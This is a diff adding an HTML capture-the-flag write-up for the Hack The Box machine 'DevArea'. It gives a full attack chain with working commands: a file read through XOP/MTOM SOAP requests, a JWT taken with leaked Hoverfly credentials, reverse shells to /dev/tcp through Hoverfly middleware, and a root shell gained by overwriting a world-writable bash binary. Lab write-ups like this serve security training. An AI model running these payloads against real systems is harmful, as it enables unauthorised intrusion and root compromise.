@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>DevArea — HTB Writeup</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet"/>
+<style>
+  :root { --bg:#141d2b; --bg2:#1a2332; --bg3:#0f1620; --green:#9fef00; --red:#ff3e3e; --orange:#ffaf00; --blue:#2ea8e5; --purple:#a44eff; --text:#a4b1cd; --text-bright:#ffffff; --border:#2a3a52; }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { background:var(--bg); color:var(--text); font-family:'Rajdhani',sans-serif; font-size:16px; line-height:1.7; min-height:100vh; }
+  body::before { content:''; position:fixed; inset:0; background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.03) 2px,rgba(0,0,0,0.03) 4px); pointer-events:none; z-index:1000; }
+  header { background:var(--bg3); border-bottom:1px solid var(--border); padding:0 2rem; display:flex; align-items:center; justify-content:space-between; height:60px; position:sticky; top:0; z-index:100; }
+  .logo { font-family:'Share Tech Mono',monospace; color:var(--green); font-size:1.2rem; letter-spacing:2px; text-decoration:none; }
+  .logo span { color:var(--text); }
+  .header-right { display:flex; gap:0.5rem; align-items:center; }
+  .badge { padding:2px 10px; border-radius:3px; font-size:0.75rem; font-weight:700; letter-spacing:1px; text-transform:uppercase; font-family:'Share Tech Mono',monospace; }
+  .badge-easy   { background:#9fef00; color:#000; }
+  .badge-medium { background:#ffaf00; color:#000; }
+  .badge-hard   { background:#ff3e3e; color:#fff; }
+  .badge-insane { background:#a44eff; color:#fff; }
+  .badge-linux  { background:var(--bg2); border:1px solid var(--border); color:var(--text); }
+  .container { max-width:1000px; margin:0 auto; padding:3rem 2rem; }
+  .hero { background:var(--bg2); border:1px solid var(--border); border-radius:8px; padding:2.5rem; margin-bottom:2.5rem; position:relative; overflow:hidden; }
+  .hero::before { content:''; position:absolute; top:0; left:0; right:0; height:3px; background:linear-gradient(90deg,var(--green),var(--blue),var(--purple)); }
+  .machine-name { font-family:'Share Tech Mono',monospace; font-size:2.8rem; color:var(--text-bright); letter-spacing:3px; line-height:1; }
+  .machine-name span { color:var(--orange); }
+  .badges { display:flex; gap:0.5rem; flex-wrap:wrap; margin-top:0.8rem; }
+  .stats-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr)); gap:1rem; margin-top:1.5rem; }
+  .stat { background:var(--bg3); border:1px solid var(--border); border-radius:5px; padding:0.8rem 1rem; }
+  .stat-label { font-size:0.7rem; text-transform:uppercase; letter-spacing:2px; color:var(--text); margin-bottom:0.3rem; font-family:'Share Tech Mono',monospace; }
+  .stat-value { font-size:1rem; color:var(--text-bright); font-family:'Share Tech Mono',monospace; }
+  .stat-value.green { color:var(--green); }
+  .stat-value.blue  { color:var(--blue); }
+  .stat-value.orange{ color:var(--orange); }
+  .chain { background:var(--bg2); border:1px solid var(--border); border-radius:8px; padding:1.5rem 2rem; margin-bottom:2.5rem; font-family:'Share Tech Mono',monospace; font-size:0.85rem; line-height:2; }
+  .chain-title { color:var(--green); font-size:0.75rem; letter-spacing:3px; text-transform:uppercase; margin-bottom:1rem; }
+  .chain-step .arrow { color:var(--green); }
+  .chain-step .user  { color:var(--orange); font-weight:700; }
+  .section { background:var(--bg2); border:1px solid var(--border); border-radius:8px; margin-bottom:1.5rem; overflow:hidden; }
+  .section-header { background:var(--bg3); border-bottom:1px solid var(--border); padding:1rem 1.5rem; display:flex; align-items:center; gap:1rem; }
+  .section-num { width:28px; height:28px; background:var(--green); color:#000; border-radius:4px; display:flex; align-items:center; justify-content:center; font-family:'Share Tech Mono',monospace; font-size:0.85rem; font-weight:700; flex-shrink:0; }
+  .section-title { font-size:1.1rem; font-weight:700; color:var(--text-bright); text-transform:uppercase; letter-spacing:1px; }
+  .section-cve { margin-left:auto; font-family:'Share Tech Mono',monospace; font-size:0.75rem; color:var(--blue); background:rgba(46,168,229,0.1); border:1px solid rgba(46,168,229,0.3); padding:2px 8px; border-radius:3px; }
+  .section-body { padding:1.5rem; }
+  p  { margin-bottom:1rem; color:var(--text); font-size:1rem; }
+  h3 { color:var(--text-bright); font-size:1rem; font-weight:700; text-transform:uppercase; letter-spacing:1px; margin:1.5rem 0 0.8rem; padding-bottom:0.4rem; border-bottom:1px solid var(--border); }
+  h3:first-child { margin-top:0; }
+  pre { background:var(--bg3); border:1px solid var(--border); border-radius:5px; padding:1.2rem 1.5rem; overflow-x:auto; margin:1rem 0; position:relative; }
+  pre::before { content:attr(data-label); position:absolute; top:0.5rem; right:0.8rem; font-family:'Share Tech Mono',monospace; font-size:0.65rem; color:var(--text); opacity:0.5; text-transform:uppercase; letter-spacing:1px; }
+  code { font-family:'JetBrains Mono',monospace; font-size:0.82rem; line-height:1.8; color:var(--text-bright); }
+  .c-green  { color:var(--green); }
+  .c-orange { color:var(--orange); }
+  .c-blue   { color:var(--blue); }
+  .c-red    { color:var(--red); }
+  .c-purple { color:var(--purple); }
+  .c-dim    { color:#546e8a; }
+  .ic { font-family:'JetBrains Mono',monospace; font-size:0.82rem; background:var(--bg3); border:1px solid var(--border); padding:1px 6px; border-radius:3px; color:var(--green); }
+  .success-box { border-left:3px solid var(--green);  background:rgba(159,239,0,0.07);  padding:0.8rem 1rem; border-radius:0 5px 5px 0; margin:1rem 0; color:var(--green);  font-family:'Share Tech Mono',monospace; font-size:0.85rem; }
+  .info-box    { border-left:3px solid var(--blue);   background:rgba(46,168,229,0.07); padding:0.8rem 1rem; border-radius:0 5px 5px 0; margin:1rem 0; font-size:0.9rem; }
+  .warn-box    { border-left:3px solid var(--orange); background:rgba(255,175,0,0.07);  padding:0.8rem 1rem; border-radius:0 5px 5px 0; margin:1rem 0; font-size:0.9rem; }
+  table { width:100%; border-collapse:collapse; margin:1rem 0; font-size:0.9rem; }
+  th { background:var(--bg3); color:var(--green); font-family:'Share Tech Mono',monospace; font-size:0.75rem; text-transform:uppercase; letter-spacing:2px; padding:0.7rem 1rem; text-align:left; border-bottom:1px solid var(--border); }
+  td { padding:0.7rem 1rem; border-bottom:1px solid var(--border); color:var(--text); }
+  tr:last-child td { border-bottom:none; }
+  .cred { font-family:'JetBrains Mono',monospace; font-size:.82rem; color:var(--orange); cursor:pointer; border:1px dashed rgba(255,175,0,.5); padding:1px 8px; border-radius:3px; background:rgba(255,175,0,.06); user-select:none; }
+  .blur { filter:blur(6px); transition:filter 0.3s; cursor:pointer; user-select:none; display:inline-block; }
+  .blur.revealed { filter:blur(0); cursor:default; }
+  #troll-modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,.85); z-index:9999; align-items:center; justify-content:center; }
+  .troll-inner { background:#1e2b3d; border:1px solid var(--green); border-radius:8px; padding:2.5rem; max-width:420px; width:90%; text-align:center; font-family:'Rajdhani',sans-serif; position:relative; overflow:hidden; }
+  .troll-inner::before { content:''; position:absolute; top:0; left:0; right:0; height:3px; background:linear-gradient(90deg,var(--green),var(--blue)); }
+  .troll-icon  { font-size:3rem; margin-bottom:.5rem; }
+  .troll-title { color:#fff; font-size:1.4rem; font-weight:700; text-transform:uppercase; letter-spacing:2px; margin-bottom:1rem; }
+  .troll-body  { color:var(--text); font-size:.95rem; line-height:1.7; margin-bottom:1.5rem; }
+  .troll-btn   { padding:.6rem 2rem; background:var(--green); border:none; color:#000; border-radius:4px; cursor:pointer; font-family:'Share Tech Mono',monospace; font-size:.85rem; font-weight:700; }
+  footer { text-align:center; padding:2rem; color:var(--text); font-family:'Share Tech Mono',monospace; font-size:0.75rem; border-top:1px solid var(--border); opacity:0.5; }
+</style>
+</head>
+<body>
+
+<header>
+  <a href="../" class="logo">SKID<span>::</span>TUTS</a>
+  <div class="header-right">
+    <span class="badge badge-medium">Medium</span>
+    <span class="badge badge-linux">Linux</span>
+  </div>
+</header>
+
+<div class="container">
+
+  <div class="hero">
+    <div class="machine-name">DEV<span>AREA</span></div>
+    <div class="badges">
+      <span class="badge badge-medium">Medium</span>
+      <span class="badge badge-linux">Linux</span>
+    </div>
+    <div class="stats-grid">
+      <div class="stat"><div class="stat-label">Target IP</div><div class="stat-value blue">10.129.xx.xxx</div></div>
+      <div class="stat"><div class="stat-label">OS</div><div class="stat-value">Ubuntu Linux</div></div>
+      <div class="stat"><div class="stat-label">Open Ports</div><div class="stat-value">21, 22, 80, 8080, 8500, 8888</div></div>
+      <div class="stat"><div class="stat-label">User Flag</div><div class="stat-value green">&#10003; Obtained</div></div>
+      <div class="stat"><div class="stat-label">Root Flag</div><div class="stat-value green">&#10003; Obtained</div></div>
+      <div class="stat"><div class="stat-label">CVEs Used</div><div class="stat-value orange">0</div></div>
+    </div>
+  </div>
+
+  <div class="chain">
+    <div class="chain-title">// Attack Chain</div>
+    <div class="chain-step"><span class="user">anonymous</span> <span class="arrow">&#8594;</span> Nmap reveals SOAP service on 8080, Hoverfly on 8888</div>
+    <div class="chain-step"><span class="user">anonymous</span> <span class="arrow">&#8594;</span> LFI via XOP/MTOM SOAP request reads /etc/systemd/system/hoverfly.service</div>
+    <div class="chain-step"><span class="user">anonymous</span> <span class="arrow">&#8594;</span> Hoverfly admin credentials extracted from service file</div>
+    <div class="chain-step"><span class="user">anonymous</span> <span class="arrow">&#8594;</span> RCE via Hoverfly middleware API → reverse shell as dev_ryan</div>
+    <div class="chain-step"><span class="user">dev_ryan</span> <span class="arrow">&#8594;</span> /usr/bin/bash world-writable → replaced with evil script</div>
+    <div class="chain-step"><span class="user">dev_ryan</span> <span class="arrow">&#8594;</span> sudo /opt/syswatch/syswatch.sh calls bash as root → root shell</div>
+    <div class="chain-step"><span class="user">root</span> <span class="arrow">&#8594;</span> <span class="c-green">pwned &#10003;</span></div>
+  </div>
+
+  <!-- SECTION 1 — Recon -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">1</div>
+      <div class="section-title">Reconnaissance</div>
+    </div>
+    <div class="section-body">
+      <p>Starting with a full port scan using Nmap with service/version detection and default scripts against the target.</p>
+
+      <pre data-label="bash"><code><span class="c-green">$</span> nmap -sC -sV -p- <span class="c-orange">10.129.xx.xxx</span></code></pre>
+
+      <pre data-label="output"><code>PORT     STATE SERVICE VERSION
+<span class="c-green">21/tcp   open  ftp</span>     vsftpd 3.0.5
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+<span class="c-green">22/tcp   open  ssh</span>     OpenSSH 9.6p1 Ubuntu
+<span class="c-green">80/tcp   open  http</span>    Apache httpd 2.4.58
+<span class="c-green">8080/tcp open  http</span>    Jetty 9.4.27.v20200227
+<span class="c-green">8500/tcp open  http</span>    Golang net/http server <span class="c-dim">(proxy)</span>
+<span class="c-green">8888/tcp open  http</span>    Golang net/http server <span class="c-dim">(Hoverfly Dashboard)</span></code></pre>
+
+      <p>Six open ports. The most interesting are <span class="ic">8080</span> running Jetty (a Java web server — likely a SOAP/web service endpoint) and <span class="ic">8888</span> which Nmap identifies as a <strong style="color:var(--text-bright)">Hoverfly Dashboard</strong>. Port <span class="ic">8500</span> identifies itself as a proxy server. Anonymous FTP on <span class="ic">21</span> is noted but nothing useful was found in the pub directory.</p>
+
+      <div class="info-box">Hoverfly is an open-source HTTP proxy/simulation tool with a REST API and web dashboard. It supports a <strong>middleware</strong> feature that executes arbitrary scripts — immediately interesting from an RCE perspective if we can authenticate.</div>
+
+      <table>
+        <tr><th>Port</th><th>Service</th><th>Notes</th></tr>
+        <tr><td>21</td><td>vsftpd 3.0.5</td><td>Anonymous login allowed, empty pub dir</td></tr>
+        <tr><td>22</td><td>OpenSSH 9.6p1</td><td>Standard SSH</td></tr>
+        <tr><td>80</td><td>Apache 2.4.58</td><td>DevArea web app</td></tr>
+        <tr><td>8080</td><td>Jetty 9.4.27</td><td>SOAP/JAX-WS employee service</td></tr>
+        <tr><td>8500</td><td>Golang HTTP</td><td>Hoverfly proxy port</td></tr>
+        <tr><td>8888</td><td>Golang HTTP</td><td>Hoverfly admin dashboard &amp; API</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <!-- SECTION 2 — LFI -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">2</div>
+      <div class="section-title">LFI via XOP/MTOM SOAP Injection</div>
+    </div>
+    <div class="section-body">
+      <p>The Jetty service on port <span class="ic">8080</span> exposes a JAX-WS SOAP endpoint at <span class="ic">/employeeservice</span>. Probing it reveals it accepts MTOM multipart requests for the <span class="ic">submitReport</span> operation.</p>
+
+      <h3>What is XOP/MTOM?</h3>
+      <p>MTOM (Message Transmission Optimization Mechanism) is a W3C standard for embedding binary data in SOAP messages. It uses XOP (XML-binary Optimized Packaging) which allows referencing external data via <span class="ic">&lt;xop:Include href="..."/&gt;</span>. The <span class="ic">href</span> attribute normally references a MIME part — but it also accepts <span class="ic">file://</span> URIs, causing the server to read local files and return their contents base64-encoded in the response.</p>
+
+      <div class="warn-box">The server doesn't validate or restrict the <span class="ic">href</span> URI scheme, allowing arbitrary local file reads as the service user.</div>
+
+      <h3>Exploiting the LFI</h3>
+      <p>We craft a malicious MTOM request targeting <span class="ic">/etc/systemd/system/hoverfly.service</span> — if Hoverfly is running as a systemd service, the service file will contain its startup command including any credentials passed as arguments.</p>
+
+      <pre data-label="bash"><code><span class="c-green">$</span> curl -s -X POST http://<span class="c-orange">10.129.xx.xxx</span>:8080/employeeservice \
+  -H <span class="c-orange">'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="&lt;root@example.com&gt;"; start-info="text/xml"'</span> \
+  --data-binary <span class="c-orange">$'--MIMEBoundary\r\n\
+Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\n\
+Content-Transfer-Encoding: 8bit\r\n\
+Content-ID: &lt;root@example.com&gt;\r\n\r\n\
+&lt;?xml version="1.0"?&gt;\
+&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://devarea.htb/"&gt;\
+&lt;soap:Body&gt;&lt;tns:submitReport&gt;&lt;arg0&gt;&lt;confidential&gt;false&lt;/confidential&gt;\
+&lt;content&gt;&lt;xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" \
+href="file:///etc/systemd/system/hoverfly.service"/&gt;&lt;/content&gt;\
+&lt;department&gt;x&lt;/department&gt;&lt;employeeName&gt;x&lt;/employeeName&gt;\
+&lt;/arg0&gt;&lt;/tns:submitReport&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;\r\n--MIMEBoundary--'</span></code></pre>
+
+      <p>The server responds with the file contents base64-encoded inside the <span class="ic">&lt;Content&gt;</span> tag of the SOAP response:</p>
+
+      <pre data-label="output"><code>&lt;return&gt;Report received from x. Department: x. Content: <span class="c-orange">W1VuaXRdCkRlc2NyaXB0aW9u...</span>&lt;/return&gt;</code></pre>
+
+      <h3>Decoding the Response</h3>
+      <pre data-label="bash"><code><span class="c-green">$</span> echo <span class="c-orange">"W1VuaXRdCkRlc2NyaXB0aW9u..."</span> | base64 -d</code></pre>
+
+      <pre data-label="output"><code>[Unit]
+Description=HoverFly service
+After=network.target
+
+[Service]
+User=dev_ryan
+Group=dev_ryan
+WorkingDirectory=/opt/HoverFly
+ExecStart=/opt/HoverFly/hoverfly -add -username admin <span class="c-red">-password <span class="cred" onclick="showTroll()">&#128274; REDACTED</span></span> -listen-on-host 0.0.0.0
+
+RestartSec=5
+...</code></pre>
+
+      <div class="success-box">&#10003; LFI successful — Hoverfly admin credentials extracted from service file</div>
+    </div>
+  </div>
+
+  <!-- SECTION 3 — Hoverfly Auth -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">3</div>
+      <div class="section-title">Hoverfly Authentication</div>
+    </div>
+    <div class="section-body">
+      <p>With the extracted credentials we authenticate to the Hoverfly REST API on port <span class="ic">8888</span> to obtain a JWT token for subsequent API calls.</p>
+
+      <pre data-label="bash"><code><span class="c-green">$</span> curl -s -X POST http://<span class="c-orange">10.129.xx.xxx</span>:8888/api/token-auth \
+  -H <span class="c-orange">'Content-Type: application/json'</span> \
+  -d <span class="c-orange">'{"username":"admin","password":"&lt;REDACTED&gt;"}'</span></code></pre>
+
+      <pre data-label="output"><code>{
+  <span class="c-blue">"token"</span>: <span class="c-orange">"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwO..."</span>
+}</code></pre>
+
+      <div class="success-box">&#10003; JWT token obtained — authenticated to Hoverfly as admin</div>
+
+      <div class="info-box">The JWT has a very long expiry (the <span class="ic">exp</span> claim decodes to a date far in the future), so we have plenty of time to use it.</div>
+    </div>
+  </div>
+
+  <!-- SECTION 4 — RCE -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">4</div>
+      <div class="section-title">RCE via Hoverfly Middleware</div>
+    </div>
+    <div class="section-body">
+      <p>Hoverfly supports a <strong style="color:var(--text-bright)">middleware</strong> feature — an external binary/script that all proxied HTTP traffic is piped through for modification. This is configured via a PUT request to <span class="ic">/api/v2/hoverfly/middleware</span>. As an authenticated admin we can set this to anything we want, giving us direct command execution as the <span class="ic">dev_ryan</span> user.</p>
+
+      <h3>Setting Up the Listener</h3>
+      <pre data-label="bash"><code><span class="c-green">$</span> nc -lvnp 4444</code></pre>
+
+      <h3>Triggering the Reverse Shell</h3>
+      <pre data-label="bash"><code><span class="c-green">$</span> curl -s -X PUT http://<span class="c-orange">10.129.xx.xxx</span>:8888/api/v2/hoverfly/middleware \
+  -H <span class="c-orange">'Authorization: Bearer &lt;JWT&gt;'</span> \
+  -H <span class="c-orange">'Content-Type: application/json'</span> \
+  -d <span class="c-orange">'{"binary":"/bin/bash","script":"bash -i &gt;&amp; /dev/tcp/10.10.xx.xxx/4444 0&gt;&amp;1 &amp;"}'</span></code></pre>
+
+      <p>Hoverfly executes the script when processing the middleware configuration, immediately triggering a callback to our listener:</p>
+
+      <pre data-label="output"><code>listening on [any] 4444 ...
+connect to [<span class="c-orange">10.10.xx.xxx</span>] from (UNKNOWN) [<span class="c-orange">10.129.xx.xxx</span>] 54312
+
+dev_ryan@devarea:/opt/HoverFly$ <span class="c-green">id</span>
+uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)
+
+dev_ryan@devarea:/opt/HoverFly$ <span class="c-green">whoami</span>
+dev_ryan</code></pre>
+
+      <div class="success-box">&#10003; Shell obtained as dev_ryan</div>
+
+      <h3>User Flag</h3>
+      <div class="success-box">dev_ryan@devarea:~$ cat user.txt<br><span class="cred" onclick="showTroll()">&#128274; REDACTED</span></div>
+    </div>
+  </div>
+
+  <!-- SECTION 5 — Privesc -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">5</div>
+      <div class="section-title">Privilege Escalation — World-Writable Bash + sudo</div>
+    </div>
+    <div class="section-body">
+      <p>With a shell as <span class="ic">dev_ryan</span> we enumerate the system for privesc vectors. Two vulnerabilities combine to give us root.</p>
+
+      <h3>Vulnerability 1 — /usr/bin/bash is World-Writable</h3>
+      <pre data-label="bash"><code>dev_ryan@devarea:/opt/HoverFly$ <span class="c-green">ls -la /usr/bin/bash</span></code></pre>
+      <pre data-label="output"><code><span class="c-red">-rwxrwxrwx</span> 1 root root 1446024 Mar 28 23:30 /usr/bin/bash</code></pre>
+
+      <p>The system bash binary has <span class="ic">777</span> permissions — any user can overwrite it. This is a critical misconfiguration.</p>
+
+      <h3>Vulnerability 2 — sudo syswatch.sh</h3>
+      <p>The <span class="ic">dev_ryan</span> user can run <span class="ic">/opt/syswatch/syswatch.sh</span> as root via sudo with no password. That script internally calls <span class="ic">bash</span> — meaning if we replace <span class="ic">/usr/bin/bash</span>, root will execute our evil version when the script runs.</p>
+
+      <div class="warn-box">The ETXTBSY error ("text file busy") prevents overwriting a running binary directly. We work around this by writing to <span class="ic">/tmp/evil_bash</span> first, then copying it over after killing all bash processes.</div>
+
+      <h3>Building the Evil Script</h3>
+      <p>We create a replacement bash that fires a root reverse shell, restores the real bash, then continues executing normally so the sudo call doesn't error out:</p>
+
+      <pre data-label="bash"><code><span class="c-dim"># Back up real bash</span>
+dev_ryan@devarea:~$ <span class="c-green">cp /bin/bash /tmp/bash.bak</span>
+
+<span class="c-dim"># Write evil script to /tmp using hex encoding to avoid special char issues</span>
+dev_ryan@devarea:~$ <span class="c-green">python3 -c "import binascii; open('/tmp/evil_bash','wb').write(binascii.unhexlify('<span class="c-orange">23212f746d702f626173682e62616b0a...</span>'))"</span>
+
+dev_ryan@devarea:~$ <span class="c-green">chmod +x /tmp/evil_bash</span></code></pre>
+
+      <p>The evil script content:</p>
+      <pre data-label="bash"><code><span class="c-red">#!/tmp/bash.bak
+bash -i &gt;&amp; /dev/tcp/<span class="c-orange">10.10.xx.xxx</span>/4445 0&gt;&amp;1 &amp;   <span class="c-dim"># fire root shell</span>
+cp /tmp/bash.bak /usr/bin/bash                    <span class="c-dim"># restore real bash</span>
+exec /tmp/bash.bak "$@"                           <span class="c-dim"># continue normally</span></span></code></pre>
+
+      <h3>Triggering Root Shell</h3>
+      <p>Start a second listener on port <span class="ic">4445</span>, then trigger the privesc — we need to kill running bash processes to release the file lock, copy the evil script over, then invoke sudo:</p>
+
+      <pre data-label="bash"><code>dev_ryan@devarea:~$ <span class="c-green">/bin/dash -c 'killall -9 bash; sleep 2; cp /tmp/evil_bash /usr/bin/bash; sudo /opt/syswatch/syswatch.sh --version' &amp;</span></code></pre>
+
+      <p>When <span class="ic">syswatch.sh</span> runs as root and calls bash, our evil script executes — firing a shell back as root:</p>
+
+      <pre data-label="output"><code>listening on [any] 4445 ...
+connect to [<span class="c-orange">10.10.xx.xxx</span>] from (UNKNOWN) [<span class="c-orange">10.129.xx.xxx</span>] 48626
+
+root@devarea:/opt/HoverFly# <span class="c-green">id</span>
+uid=0(root) gid=0(root) groups=0(root)
+
+root@devarea:/opt/HoverFly# <span class="c-green">whoami</span>
+root</code></pre>
+
+      <div class="success-box">&#10003; ROOT shell obtained</div>
+
+      <h3>Root Flag</h3>
+      <div class="success-box">root@devarea:~# cat root.txt<br><span class="cred" onclick="showTroll()">&#128274; REDACTED</span></div>
+    </div>
+  </div>
+
+</div>
+
+<div id="troll-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:9999;align-items:center;justify-content:center;">
+  <div class="troll-inner">
+    <div class="troll-icon">&#128064;</div>
+    <div class="troll-title">Really?</div>
+    <div class="troll-body">
+      The flags are <strong style="color:var(--green)">inside the box</strong> &mdash; not in a writeup.<br><br>
+      Go find them yourself. That&apos;s the whole point.
+    </div>
+    <button class="troll-btn" onclick="document.getElementById('troll-modal').style.display='none'">Fine. I&apos;ll do it myself.</button>
+  </div>
+</div>
+<script>function showTroll(){document.getElementById('troll-modal').style.display='flex';}</script>
+
+<footer>HackTheBox &middot; DevArea &middot; Medium &middot; Linux &middot; by Chapo and maybe Claude too....</footer>
+
+</body>
+</html>
